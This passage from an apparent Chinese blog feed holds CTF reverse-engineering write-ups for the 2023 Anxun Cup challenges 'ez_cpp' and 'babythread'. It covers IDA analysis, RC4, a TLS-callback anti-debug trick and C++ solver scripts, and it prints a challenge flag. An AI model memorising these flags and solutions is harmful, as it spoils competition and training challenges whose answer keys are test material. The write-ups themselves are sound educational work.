class="token operator">^=</span> <span class="token number">4u</span><span class="token punctuation">;</span>            <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>                <span class="token keyword">int</span> result <span class="token operator">=</span> v6<span class="token punctuation">[</span>v4<span class="token punctuation">]</span><span class="token punctuation">;</span>                <span class="token keyword">if</span> <span class="token punctuation">(</span>result<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token operator">--</span>result<span class="token punctuation">)</span>                        key<span class="token punctuation">[</span>v4<span class="token punctuation">]</span> <span class="token operator">^=</span> <span class="token number">9u</span><span class="token punctuation">;</span>                <span class="token punctuation">&#125;</span>                <span class="token keyword">else</span>                    key<span class="token punctuation">[</span>v4<span class="token punctuation">]</span> <span class="token operator">+=</span> <span class="token number">2</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">int</span> result <span class="token operator">=</span> v6<span class="token punctuation">[</span>v4<span class="token punctuation">]</span><span class="token punctuation">;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span>result<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token operator">--</span>result<span class="token punctuation">)</span>                    key<span class="token punctuation">[</span>v4<span class="token punctuation">]</span> <span class="token operator">^=</span> <span class="token number">6u</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>            <span class="token keyword">else</span>                key<span class="token punctuation">[</span>v4<span class="token punctuation">]</span> <span class="token operator">+=</span> <span class="token number">5</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token operator">++</span>v4<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> <span class="token number">32</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"%c"</span><span class="token punctuation">,</span> key<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>cout<span class="token operator">&lt;&lt;</span>endl<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">void</span> <span class="token function">v19</span><span class="token punctuation">(</span><span class="token keyword">int</span> <span class="token operator">*</span>key<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> <span class="token number">32</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>key<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">>=</span> <span class="token char">'a'</span> <span class="token operator">&amp;&amp;</span> key<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">&lt;=</span> <span class="token char">'z'</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            key<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> key<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">13</span><span class="token punctuation">;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span>key<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">></span> <span class="token char">'z'</span><span class="token punctuation">)</span>                key<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> key<span class="token punctuation">[</span>i<span class="token punctuation">]</span>  <span class="token operator">%</span> <span class="token char">'z'</span> <span class="token operator">+</span> <span class="token char">'a'</span> <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>key<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">>=</span> <span class="token char">'A'</span> <span class="token operator">&amp;&amp;</span> key<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">&lt;=</span> <span class="token char">'Z'</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            key<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> key<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">13</span><span class="token punctuation">;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span>key<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">></span> <span class="token char">'Z'</span><span class="token punctuation">)</span>                key<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> key<span class="token punctuation">[</span>i<span class="token punctuation">]</span>  <span class="token operator">%</span> <span class="token char">'Z'</span> <span class="token operator">+</span> <span class="token char">'A'</span> <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> <span class="token number">32</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"%c"</span><span class="token punctuation">,</span> key<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>cout<span class="token operator">&lt;&lt;</span>endl<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">int</span> v5<span class="token punctuation">;</span> <span class="token comment">// esi</span>    <span class="token keyword">int</span> v6<span class="token punctuation">;</span> <span class="token comment">// edi</span>    <span class="token keyword">char</span> v7<span class="token punctuation">;</span> <span class="token comment">// bj</span>    <span class="token keyword">int</span> v8<span class="token punctuation">;</span> <span class="token comment">// esi</span>    <span class="token keyword">int</span> v15<span class="token punctuation">[</span><span class="token number">10</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment">// [esp+10Ch] [ebp-68h]</span>    <span class="token keyword">int</span> v16<span class="token punctuation">;</span> <span class="token comment">// [esp+128h] [ebp-4Ch]</span>    <span class="token keyword">int</span> v17<span class="token punctuation">;</span> <span class="token comment">// [esp+12Ch] [ebp-48h]</span>    <span class="token keyword">unsigned</span> <span class="token keyword">int</span> v14<span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">&#123;</span>            <span class="token number">0x00000022</span><span class="token punctuation">,</span> <span class="token number">0xFFFFFFA2</span><span class="token punctuation">,</span> <span class="token number">0x00000072</span><span class="token punctuation">,</span> <span class="token number">0xFFFFFFE6</span><span class="token punctuation">,</span>            <span class="token number">0x00000052</span><span class="token punctuation">,</span> <span class="token number">0xFFFFFF8C</span><span class="token punctuation">,</span> <span class="token number">0xFFFFFFF2</span><span class="token punctuation">,</span> <span class="token number">0xFFFFFFD4</span><span class="token punctuation">,</span>            <span class="token number">0xFFFFFFA6</span><span class="token punctuation">,</span> <span class="token number">0x0000000A</span><span class="token punctuation">,</span> <span class="token number">0x0000003C</span><span class="token punctuation">,</span> <span class="token number">0x00000024</span><span class="token punctuation">,</span>            <span class="token number">0xFFFFFFA6</span><span class="token punctuation">,</span> <span class="token number">0xFFFFFF9C</span><span class="token punctuation">,</span> <span class="token number">0xFFFFFF86</span><span class="token punctuation">,</span> <span class="token number">0x00000024</span><span class="token punctuation">,</span>            <span class="token number">0x00000042</span><span class="token punctuation">,</span> <span class="token number">0xFFFFFFD4</span><span class="token punctuation">,</span> <span class="token number">0x00000022</span><span class="token punctuation">,</span> <span class="token number">0xFFFFFFB6</span><span class="token punctuation">,</span>            <span class="token number">0x00000014</span><span class="token punctuation">,</span> <span class="token number">0x00000042</span><span class="token punctuation">,</span> <span class="token number">0xFFFFFFCE</span><span class="token punctuation">,</span> <span class="token number">0xFFFFFFAC</span><span class="token punctuation">,</span>            <span class="token number">0x00000014</span><span class="token punctuation">,</span> <span class="token number">0x0000006A</span><span class="token punctuation">,</span> <span class="token number">0x0000002C</span><span class="token punctuation">,</span> <span class="token number">0x0000007C</span><span class="token punctuation">,</span>            <span class="token number">0xFFFFFFE4</span><span class="token punctuation">,</span> <span class="token number">0xFFFFFFE4</span><span class="token punctuation">,</span> <span class="token number">0xFFFFFFE4</span><span class="token punctuation">,</span> <span class="token number">0x0000001E</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> <span class="token number">10</span><span class="token punctuation">;</span> <span class="token operator">++</span>i <span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        v15<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> i <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    v5 <span class="token operator">=</span> v15<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    v16 <span class="token operator">=</span> v17 <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>  <span class="token comment">// IDA 未给初值，这里是 0</span>    v7 <span class="token operator">=</span> <span class="token function">sub_411177</span><span class="token punctuation">(</span>v15<span class="token punctuation">[</span><span class="token number">5</span><span class="token punctuation">]</span> <span class="token operator">+</span> v15<span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">]</span> <span class="token operator">*</span> <span class="token punctuation">(</span>v15<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">+</span> v15<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span> <span class="token operator">+</span> v15<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">-</span> v15<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">+</span> v17 <span class="token operator">*</span> v16 <span class="token operator">*</span> v15<span class="token punctuation">[</span><span class="token number">6</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token number">8</span> <span class="token operator">*</span> v16<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"v7: %d\n"</span><span class="token punctuation">,</span> v7<span class="token punctuation">)</span><span class="token punctuation">;</span>    v6 <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>    v8 <span class="token operator">=</span> <span class="token number">8</span> <span class="token operator">*</span> v5<span class="token punctuation">;</span>    <span class="token keyword">int</span> key<span class="token punctuation">[</span><span class="token number">32</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">do</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">int</span> tmp <span class="token operator">=</span> v7 <span class="token operator">^</span> <span class="token punctuation">(</span>v14<span class="token punctuation">[</span>v6<span class="token punctuation">]</span> <span class="token operator">&amp;</span> <span class="token number">0xFF</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment">// 注意 char v7 为一字节，这里 &amp; 0xFF 取一字节</span>        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> j <span class="token operator">=</span> <span class="token number">32</span><span class="token punctuation">;</span> j <span class="token operator">&lt;</span> <span class="token number">127</span><span class="token punctuation">;</span> <span class="token operator">++</span>j<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  <span class="token comment">// 爆破 sub_411177(v21[v6], v8)</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">sub_411177</span><span class="token punctuation">(</span>j<span class="token punctuation">,</span> v8<span class="token punctuation">)</span> <span class="token operator">==</span> tmp<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                key<span class="token punctuation">[</span>v6<span class="token punctuation">]</span> <span class="token operator">=</span> j<span class="token punctuation">;</span>                <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"%c"</span><span class="token punctuation">,</span> key<span class="token punctuation">[</span>v6<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token keyword">break</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>        <span class="token punctuation">&#125;</span>        <span class="token operator">++</span>v6<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">while</span> <span class="token punctuation">(</span>v6 <span class="token operator">&lt;</span> <span class="token number">32</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    cout<span class="token operator">&lt;&lt;</span>endl<span class="token punctuation">;</span>    <span class="token function">v20</span><span class="token punctuation">(</span>key<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">v19</span><span class="token punctuation">(</span>key<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><hr><h1 id="结果"><a href="#结果" class="headerlink" title="结果"></a>结果</h1><blockquote><p>SYC{Y3S-yE5-y0u-S0Ve-Th3-C9P!!!}</p></blockquote><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/%E5%AE%89%E6%B4%B5%E6%9D%AF2023-ez_cpp22.png" alt="安洵杯2023-ez_cpp22.png"></p><p>最后将 <code>&#39;a&#39;</code> 改为 <code>&#39;&#123;&#39;</code> 即可，<code>&#39;a&#39; + 13 = &#39;&#123;&#39;</code>，这里没有像标准的凯斯密码那样取余数循环</p>]]></content>
      
      
      <categories>
          
          <category> 逆向工程 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Writeup </tag>
            
            <tag> Reverse </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>【安洵杯 2023】babythread</title>
      <link href="/posts/bdcb362b.html"/>
      <url>/posts/bdcb362b.html</url>
      
        <content type="html"><![CDATA[<h1 id="收获"><a href="#收获" class="headerlink" title="收获"></a>收获</h1><ul><li><p><mark>TLS 回调函数的反调试，创建两个独立线程，使用 TLS 修改变量的值</mark></p></li><li><p><code>rc4()</code> 加密的伪代码形式，以及加密与解密</p></li></ul><hr><p><a href="http://ctf.i-soon.net:8080/account/login?from=/games">（2023年6月10日）【安洵杯 2023】babythread</a></p><hr><h1 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h1><p>下载文件，双击打开：</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/%E5%AE%89%E6%B4%B5%E6%9D%AF2023-babyThread1.png" alt="安洵杯2023-babyThread1.png"></p><p>在 IDA 分析：</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/%E5%AE%89%E6%B4%B5%E6%9D%AF2023-babyThread2.png" alt="安洵杯2023-babyThread2.png"></p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/%E5%AE%89%E6%B4%B5%E6%9D%AF2023-babyThread3.png" alt="安洵杯2023-babyThread3.png"></p><p>通过 <code>CreateThread()</code> 创建了两个线程</p><p>跟进 <code>StartAddress</code>：</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/%E5%AE%89%E6%B4%B5%E6%9D%AF2023-babyThread4.png" alt="安洵杯2023-babyThread4.png"></p><p>只有一个复制操作，Str &#x3D; “D..^!ARBIh@;K:dAU-K`“</p><p>跟进 <code>sub_731316()</code>，会执行 <code>sub_731B80()</code> ：</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/%E5%AE%89%E6%B4%B5%E6%9D%AF2023-babyThread5.png" alt="安洵杯2023-babyThread5.png"></p><p>可以看到程序的主要逻辑，用户输入 <code>Str</code>，然后进行 <code>sub_73129E(16, Str, v5, Buf2)</code> 的处理，最后将 <code>Buf2</code> 与 <code>unk_73B018</code> 处的数据比对，如果相同则校验通过</p><p>查看 <code>unk_73B018</code>：</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/%E5%AE%89%E6%B4%B5%E6%9D%AF2023-babyThread6.png" alt="安洵杯2023-babyThread6.png"></p><p>使用 IDA 将数据导出：<code>unsigned char unk_73B018[32] = &#123;0xDE, 0x1C, 0x22, 0x27, 0x1D, 0xAE, 0xAD, 0x65, 0xAD, 0xEF, 0x6E, 0x41, 0x4C, 0x34, 0x75, 0xF1, 0x16, 0x50, 0x50, 0xD4, 0x48, 0x69, 0x6D, 0x93, 0x36, 0x1C, 0x86, 0x3B, 0xBB, 0xD0, 0x4C, 0x91&#125;</code></p><p>跟进 <code>sub_73129E(16, Str, v5, Buf2)</code>，会执行 <code>sub_731DA0()</code>：</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/%E5%AE%89%E6%B4%B5%E6%9D%AF2023-babyThread7.png" alt="安洵杯2023-babyThread7.png"></p><p>查看 <code>Str</code> 内容：</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/%E5%AE%89%E6%B4%B5%E6%9D%AF2023-babyThread9.png" alt="安洵杯2023-babyThread9.png"></p><p>Str &#x3D; “FD,B0?YORg@:*VTCLnY4”</p><p>后面那一段代码形似 <code>rc4()</code> 的加密算法，跟进 <code>sub_731127()</code>，会执行 <code>sub_7320E0()</code>：</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/%E5%AE%89%E6%B4%B5%E6%9D%AF2023-babyThread8.png" alt="安洵杯2023-babyThread8.png"></p><p>明显是 <code>rc4()</code> 的初始化</p><p>因此 <code>sub_73129E(16, Str, v5, Buf2)</code> 做的是 <code>rc4()</code> 加密，分析可知 <code>Str</code> 为密钥，<code>Buf2</code> 为密文，<code>unk_73B018</code> 为加密后的 flag<br>结合 <code>sub_731127(v12, a1, v6)</code> 可知，<code>v12</code> 是密钥，<code>Buf2</code> 是密文</p><p>但是分析发现密钥有很多不同的值<br>尝试用 “D..^!ARBIh@;K:dAU-K`“ 和 “FD,B0?YORg@:*VTCLnY4” 解密都不正确</p><p>在字符串中也没有其他形似这样的格式：</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/%E5%AE%89%E6%B4%B5%E6%9D%AF2023-babyThread10.png" alt="安洵杯2023-babyThread10.png"></p><p>可见这个题主要问题在于寻找真正的密钥 <code>Key</code></p><p>于是想通过动态调试获得密钥 <code>Key</code>，但是发现无法调试（后来发现在 OllyDBG 中是可以的，因为 OllyDBG 具有反反调试的功能）</p><p>程序中存在 <code>TlsCallback()</code> 回调函数，可以反调试：</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/%E5%AE%89%E6%B4%B5%E6%9D%AF2023-babyThread11.png" alt="安洵杯2023-babyThread11.png"></p><p>发现这里的 <code>Str</code> 就是前面的 “FD,B0?YORg@:*VTCLnY4”</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/%E5%AE%89%E6%B4%B5%E6%9D%AF2023-babyThread12.png" alt="安洵杯2023-babyThread12.png"></p><p>所以 <code>rc4()</code> 的密钥是被 TLS 回调函数修改过的</p><blockquote><p>后面在网上才了解到 TLS 回调函数的反调试</p><p>线程局部存储（Thread Local Storage，TLS）是一种线程级别的存储机制，它允许每个线程在运行时都拥有自己的私有变量，<strong>这些变量只能被该线程访问，而不会被其他线程所共享</strong></p><p>TLS 回调函数是指，每当创建&#x2F;终止进程的线程时会自动调用执行的函数。创建的主线程也会自动调用回调函数，且其调用执行先于 EP 代码。</p></blockquote><p>根据 <code>Stream = fopen(&quot;babyThread.exe&quot;, &quot;rb&quot;)</code> 打开 babyThread.exe 文件</p><p><mark><code>fseek()</code> 函数可以用于移动文件指针到指定的位置，从而在文件中进行随机访问或定位</mark><br><code>fseek(Stream, 77, 0)</code> 指将文件指针偏移 77 个字节</p><p>将程序拖入 010Editor：</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/%E5%AE%89%E6%B4%B5%E6%9D%AF2023-babyThread13.png" alt="安洵杯2023-babyThread13.png"></p><p>指针偏移 77 个字节后指向 0x21，即：<code>&#39;!&#39;</code> 处</p><p>然后使用 <code>fread(Str, 1u, 0x14u, Stream)</code> 从 Stream 中读取当前指针后 20 字节，并存储在 <code>Str</code> 中  </p><p>得到 Str &#x3D; “!This_program_cannot”</p><p>所以真正的 <code>Key</code> 被修改为了 “!This_program_cannot”，按照程序逻辑编写解密脚本即可</p><hr><h1 id="脚本一"><a href="#脚本一" class="headerlink" title="脚本一"></a>脚本一</h1><pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span>  </span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;iostream></span>  </span>  <span class="token keyword">using</span> <span class="token keyword">namespace</span> std<span class="token punctuation">;</span>    <span class="token keyword">unsigned</span> <span class="token keyword">char</span> <span class="token function">HIBYTE</span><span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">int</span> w<span class="token punctuation">)</span>  <span class="token comment">// 取四字节数据的最高一字节  </span><span class="token punctuation">&#123;</span>      <span class="token keyword">return</span> <span class="token punctuation">(</span>w <span class="token operator">>></span> <span class="token number">8</span> <span class="token operator">*</span> <span class="token number">3</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">0xFF</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span>    <span class="token keyword">unsigned</span> <span class="token keyword">char</span> <span class="token function">BYTE2</span><span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">int</span> w<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  <span class="token comment">// 取四字节数据的次高一字节  </span>    <span class="token keyword">return</span> <span class="token punctuation">(</span>w <span class="token operator">>></span> <span class="token number">8</span> <span class="token operator">*</span> <span class="token number">2</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">0xFF</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span>    <span class="token keyword">unsigned</span> <span class="token keyword">char</span> <span class="token function">BYTE1</span><span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">int</span> w<span class="token punctuation">)</span>  <span class="token comment">// 取四字节数据的次低一字节  </span><span class="token punctuation">&#123;</span>      <span class="token keyword">return</span> <span class="token punctuation">(</span>w <span class="token operator">>></span> <span class="token number">8</span> <span class="token operator">*</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">0xFF</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span>      <span class="token keyword">void</span> <span class="token function">rc4_init</span><span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">char</span> <span class="token operator">*</span>s<span class="token punctuation">,</span> <span class="token keyword">unsigned</span> <span class="token keyword">char</span> <span class="token operator">*</span>key<span class="token punctuation">,</span> <span class="token keyword">unsigned</span> <span class="token keyword">long</span> key_Len<span class="token punctuation">)</span>  <span class="token punctuation">&#123;</span>      <span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">,</span> j <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>      <span class="token keyword">unsigned</span> <span class="token keyword">char</span> k<span class="token punctuation">[</span><span class="token number">256</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token number">0</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span>    <span class="token comment">//临时向量 k    unsigned char tmp = 0;  </span>    <span class="token keyword">for</span><span class="token punctuation">(</span>i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> <span class="token number">256</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>          s<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> i<span class="token punctuation">;</span>          k<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">char</span><span class="token punctuation">)</span> key<span class="token punctuation">[</span>i <span class="token operator">%</span> key_Len<span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token comment">//Len = strlen(key)，密钥的长度  </span>    <span class="token punctuation">&#125;</span>      <span class="token keyword">for</span><span class="token punctuation">(</span>i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> <span class="token number">256</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token comment">//打乱s表  </span>        j <span class="token operator">=</span> <span class="token punctuation">(</span>j <span class="token operator">+</span> s<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">+</span> k<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">%</span> <span class="token number">256</span><span class="token punctuation">;</span>          tmp <span class="token operator">=</span> s<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">;</span>          s<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> s<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token comment">//交换s[i]和s[j]  </span>        s<span class="token punctuation">[</span>j<span class="token punctuation">]</span> <span class="token operator">=</span> tmp<span class="token punctuation">;</span>      <span class="token punctuation">&#125;</span>  <span class="token punctuation">&#125;</span>    <span class="token keyword">void</span> <span class="token function">rc4_crypt</span><span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">char</span> <span class="token operator">*</span>s<span class="token punctuation">,</span> <span class="token keyword">unsigned</span> <span class="token keyword">char</span> <span class="token operator">*</span>Data<span class="token punctuation">,</span> <span class="token keyword">unsigned</span> <span class="token keyword">long</span> Data_Len<span class="token punctuation">)</span>  <span class="token punctuation">&#123;</span>      <span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">,</span> j <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">,</span> t <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>      <span class="token keyword">unsigned</span> <span class="token keyword">long</span> k <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>      <span class="token keyword">unsigned</span> <span class="token keyword">char</span> tmp<span class="token punctuation">;</span>      <span class="token keyword">for</span><span class="token punctuation">(</span>k <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> k <span class="token operator">&lt;</span> Data_Len<span class="token punctuation">;</span> k<span class="token operator">++</span><span class="token punctuation">)</span>      <span class="token punctuation">&#123;</span>          i <span class="token operator">=</span> <span class="token punctuation">(</span>i <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">%</span> <span class="token number">256</span><span class="token punctuation">;</span>          j <span class="token operator">=</span> <span class="token punctuation">(</span>j <span class="token operator">+</span> s<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">%</span> <span class="token number">256</span><span class="token punctuation">;</span>          tmp <span class="token operator">=</span> s<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">;</span>          s<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> s<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token comment">//交换s[i]和s[j]  </span>        s<span class="token punctuation">[</span>j<span class="token punctuation">]</span> <span class="token operator">=</span> tmp<span class="token punctuation">;</span>          t <span class="token operator">=</span> <span class="token punctuation">(</span>s<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">+</span> s<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">%</span> <span class="token number">256</span><span class="token 